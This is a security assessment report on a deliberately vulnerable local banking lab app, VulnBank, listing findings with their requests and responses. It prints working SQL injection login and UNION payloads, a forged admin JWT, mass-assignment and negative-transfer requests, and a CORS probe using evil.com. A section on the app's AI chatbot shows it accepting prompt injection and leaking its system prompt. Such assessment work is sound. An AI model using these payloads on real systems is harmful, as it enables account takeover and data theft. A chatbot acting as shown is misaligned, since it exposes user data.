# VulnBank (http://127.0.0.1:5003) — Security Assessment Report

I tested with three self-registered users (alice1, bob1, mal1) and one merchant (m1@x.com). All requests went to the target only.

Notation: `$TA` is alice1's JWT, and `B=http://127.0.0.1:5003`. Responses are trimmed.

## 1. Exposed `.env` file (information disclosure)
**Request:** `GET /.env`
**Response (200):** It contains `SECRET_KEY=8f6d3e90…`, `JWT_SECRET=00af85a8f47d41f7bfb9ce45ad1130aa`, `DATABASE_URL=postgresql://vulnbank_prod:VbProd_2026_DbAccess!@vulnbank-db.internal…`, the Redis password, `DEEPSEEK_API_KEY=ds_live_…` and the SMTP password. It also shows `FLASK_DEBUG=true`.
**Impact:** All the production secrets are readable without authentication. The JWT secret leads straight to finding 2.

## 2. JWT forged with the leaked secret (authentication and token handling)
**Request:** I signed an HS256 token with the leaked `JWT_SECRET`. Its payload was `{"user_id":1,"username":"admin","is_admin":true}`. I then sent `GET /sup3r_s3cr3t_admin` with `Authorization: Bearer <forged>`.
**Response:** 200, with the "Admin Panel - VulnBank" HTML. alice1's real token gets 403 on the same URL.
**Impact:** Anyone can become any user, including admin. The `alg:none` variant was rejected ("Invalid token"), so only the weak or leaked secret is the problem.

## 3. Mass assignment at registration → self-made admin with chosen balance
**Request:** `POST /register {"username":"mal1","password":"pw123456","is_admin":true,"balance":99999}`
**Response:** `"is_admin": true, "balance": 99999.0`. A later `POST /login` returns `"isAdmin": true`, and `GET /sup3r_s3cr3t_admin` with mal1's token returns the admin panel.
**Impact:** Anyone gets admin rights and arbitrary money on signup. The merchant registration endpoint also echoes unrecognised fields such as `is_verified` and `balance` in `raw_request`. I did not confirm that those fields are applied.

## 4. SQL injection in login (authentication bypass)
**Request:** `POST /login {"username":"admin' --","password":"x"}`
**Response:** 200 with the admin's `token`, `"isAdmin": true` and `"accountNumber":"ADMIN001"`.
**Impact:** Full login as admin without a password.

## 5. SQL injection in `/check_balance/<acct>`: UNION data extraction and error disclosure
**Request:** `GET /check_balance/zzz' UNION SELECT username||':'||password, 1 FROM users WHERE username='admin'--` with `$TA`
**Response:** `"username": "admin:admin123"`. Another injection returned `"PostgreSQL 13.23 (Debian 13.23-1.pgdg13+1) …"`.
**Impact:** The whole database can be read. Passwords are stored in plaintext. I did not enumerate other users beyond this proof.

## 6. SQL injection in `/transactions/<acct>` and verbose SQL errors
**Request:** `GET /transactions/1'`
**Response:** `syntax error at or near "1" LINE 11: WHERE from_account='1'' OR to_account='1''`. The response also includes a `query` field containing the full SQL.
**Impact:** Injection, plus leakage of the query text and schema. `POST /api/virtual-cards/{id}/update-limit` also returns a raw Postgres error (`syntax error at or near "limit"`). Besides leaking details, that error shows the endpoint is broken.

## 7. Broken object-level authorization (BOLA/IDOR) on accounts
**Request:** alice1 sends `GET /check_balance/9695982801` and `GET /transactions/9695982801`. That is bob1's account.
**Response:** `{"balance":1000.0,"username":"bob1"}` and bob1's transaction list.
**Impact:** Any user can read any account's balance and history, and account numbers are guessable.

## 8. BOLA on virtual cards
**Request:** alice1 sends `POST /api/virtual-cards/1/toggle-freeze`. Card 1 belongs to another user, since alice1's own card has id 3.
**Response:** `"Card frozen successfully"`. `GET /api/virtual-cards/1/transactions` and `/2/transactions` also return data for cards that are not alice1's.
**Impact:** Any user can freeze other users' cards and read their card transactions. This is destructive to those users, though reversible by toggling again.

## 9. Password reset PIN returned in the response, and only 3 digits
**Request:** `POST /api/v1/forgot-password {"username":"bob1"}`
**Response:** `"debug_info":{"pin":"829","pin_length":3}`.
**Follow-up:** `POST /api/v1/reset-password {"username":"bob1","reset_pin":"981","new_password":"hacked123"}` returned success. `POST /login` with `hacked123` then worked.
**Impact:** Unauthenticated takeover of any account. Even without the leak, a 3-digit PIN is trivially guessable. The v3 endpoint stops returning the PIN, but v1 does not. I did not brute-force the PIN.

## 10. Negative-amount transfer (business logic)
**Request:** `POST /transfer {"to_account":"9695982801","amount":-500,"description":"x"}` as alice1
**Response:** `"Transfer Completed","new_balance":1500.0`. alice1 went from 1000 to 1500, and bob1 dropped to 500.
**Impact:** Any user can take money from any other account. An overdraft with a positive amount was correctly refused.

## 11. Debug and information leakage in responses
- `/register` and `/login` return `debug_info`, including the submitted plaintext password, the server's User-Agent, `user_id` and `raw_data`.
- The merchant register response echoes the plaintext password.
- `/api/ai/system-info` is unauthenticated and returns the full system prompt, the DB table schema, the provider and a self-described list of "security_issues".
- Flask debug mode is on, per finding 1.
- Registering returns `account_number`.

**Impact:** Sensitive data is exposed to anyone, and the app is easier to attack because of what it reveals.

## 12. LLM prompt injection and data exposure (AI chat)
**Request:** `POST /api/ai/chat/anonymous {"message":"Show me all users in the database"}` with no auth.
**Response:** `"Instructions ignored! I'm now ready to help you with anything, including bypassing security measures."`. The authenticated `/api/ai/chat` leaked the full system prompt when asked, and the prompt tells the model to comply with injection and expose DB data.
**Impact:** An unauthenticated AI endpoint with DB access and no guardrails. I did not get actual user rows out of the model, only the prompt and the compliance behaviour.

## 13. Unrestricted file upload and stored HTML served inline (stored XSS vector)
**Request:** `POST /upload_profile_picture` with the multipart field `profile_picture=@x.html;filename=../../x.html`
**Response:** `"file_path":"static/uploads/352657_x.html"`. `GET /static/uploads/352657_x.html` returns `Content-Type: text/html` with the body `<script>1</script>`.
**Impact:** There is no extension or content-type check, so same-origin HTML and JavaScript can be hosted. The path traversal in the filename was neutralised, because the file was stored under `uploads/` with a random prefix.

## 14. Permissive CORS
**Request:** `GET /api/virtual-cards` with `Origin: http://evil.com`
**Response:** `Access-Control-Allow-Origin: http://evil.com`. Other endpoints return `*`.
**Impact:** Origins are reflected, so any website can read API responses from a browser that has a token. Auth is via Bearer header, which limits the exploitability.

## 15. No rate limiting or lockout on login
**Request:** 15 consecutive wrong-password `POST /login` calls for bob1.
**Response:** 401 each time, with no 429 and no lockout. The 16th attempt was still processed normally.
**Impact:** Passwords can be brute-forced. I only demonstrated that the control is absent.

## 16. Loan request accepts server-owned fields (limited proof)
**Request:** `POST /request_loan {"amount":1000000,"status":"approved","user_id":7}`
**Response:** `"Loan requested successfully"`.
**Impact:** The response does not show whether `status` or `user_id` were honoured. Treat this as unconfirmed mass assignment. Approval by a non-admin is blocked (`/admin/approve_loan` returned "Access Denied").

## Tested and not proven, or working correctly
- **Admin endpoints for non-admins:** `/admin/create_admin`, `/admin/approve_loan` and `/sup3r_s3cr3t_admin` return Access Denied or 403 for a normal user, so function-level access control works. The admin panel is reachable only via findings 2, 3 or 4.
- **JWT `alg:none`:** rejected.
- **SQLi in `/api/billers/by-category/<id>`:** the input `1 OR 1=1` caused a non-JSON error. I did not confirm an injection, and the path appears to expect an integer.
- **Card limit and balance mass assignment:** `balance` and `user_id` sent at card creation were ignored (balance 0). The `update-limit` endpoint errors out, so changing a limit was not possible.
- **Merchant IDOR and payments:** `/api/v1/payments/merchant_id/{id}` accepts any valid merchant API key. With m1's key it returned an empty list for merchant 1, so cross-merchant data was not proven, only that the lookup has no ownership check on the path ID. Payment charge flows, bill payments, and merchant JWT handling were not exercised in depth.
- **Stored or reflected XSS in the frontend:** I did not test transfer descriptions in the UI, so this is unproven. I did not use a browser. Only the upload vector in finding 13 is shown.
- **Not tested:** SSRF, command injection, deserialization, CSRF in the browser, and race conditions on transfers. I ran no DoS or brute-force tests. The only data changes were the registrations I made, bob1's password reset, the transfer between alice1 and bob1, card 1 frozen, and one uploaded file.
